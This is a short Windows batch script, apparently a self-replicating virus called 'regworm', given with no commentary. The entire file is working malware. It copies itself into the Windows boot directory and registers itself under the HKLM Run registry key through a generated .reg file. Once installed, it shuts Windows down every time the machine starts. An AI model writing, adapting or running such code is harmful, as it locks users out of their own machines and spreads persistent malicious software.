if "%0"=="%winbootdir%\REGWORM.BAT" goto regcode >nul
if "%0.bat"=="%winbootdir%\REGWORM.BAT" goto regcode >nul
type %0 >%winbootdir%\regworm.bat 
@echo:REGEDIT4 >%winbootdir%\reg.reg
@echo:>>c:\reg.reg
@echo:[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%winbootdir%\reg.reg
@echo:"regworm"="regworm.bat">>%winbootdir%\reg.reg
goto reginf
:reginf 
regedit %winbootdir%\reg.reg >nul
goto regend
:regcode
%windir%\rundll32.exe %windir%\user.exe,exitwindows >nul
:regend

